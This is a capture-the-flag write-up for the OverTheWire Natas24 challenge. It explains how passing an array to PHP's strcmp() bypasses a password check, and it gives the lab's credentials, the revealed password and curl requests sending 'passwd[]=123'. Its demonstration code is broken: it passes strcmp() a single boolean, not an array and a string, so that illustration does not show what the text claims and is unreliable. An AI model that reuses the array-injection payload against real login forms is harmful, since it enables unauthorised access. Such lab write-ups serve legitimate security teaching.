---
category: natas
title: Natas24 - Vulnerability of strcmp()
---

website: http://natas24.natas.labs.overthewire.org/ (password: OsRmXFguozKpTZZ5X14zNO43379LZveg)

In this challenge, a password is printed out if the following condition is true: `if(!strcmp($_REQUEST["passwd"],"<censored>"))`. As shown in this code snippet, it compares the user input with the password. Only the user's input is the same with the predefined password will the password be printed out.

The logic here is absolutely correct, but the issue is the use of the function `strcmp()`. According to a note in the PHP manual: "If you rely on `strcmp` for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.", we can see that `strcmp()` may malfunction if a user provided an array.

To give you an intuitive idea about it, let's use `strcmp()` to compare an empty array with a string "123". Ideally this function should return `FALSE` because they <em>are</em> different. However, let's take a look at its execution results:

```shell
php > if ( !strcmp(array() == "123") ) { print "equal"; } else { print "not equal"; }
Warning: strcmp() expects exactly 2 parameters, 1 given in php shell code on line 1
equal

php >
```

As you can see, the function shows a warning and the string "equal" is printed out though it is not supposed to. That means, we can exploit the vulnerability of `strcmp` by crafting a password array instead of a password string.

Given that in mind, I sent a request with the following payload using curl, and the website returned me the password "GHF6X7YwACaYYssHVY05cFq83hRktl4c" as a response.

```shell
### Send a request using GET.
$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg "http://natas24.natas.labs.overthewire.org/?passwd[]=123"
### Or, send a request using POST.
$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg  "http://natas24.natas.labs.overthewire.org" -d "passwd[]=123"
### Both above curl requests will work.
```

In the above two commands, we used a pair of square brackets (i.e. `passwd[]`) to indicate that the `passwd` in the request is an array.
One should notice that if you are using an old version of curl, you may see this error:

```shell
$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg "http://natas24.natas.labs.overthewire.org/?passwd[]=123"
curl: (3) [globbing] bad range specification in column 51
```

If you hit this error, please use the flag `-g` in your curl command. When you set this option, you can specify URLs that contain the letters {}[] without having them being interpreted by curl.


<strong>CONCLUSION</strong>

Similar to the previous challenge, user input validation is important. This validation should include value type check, special character check etc.

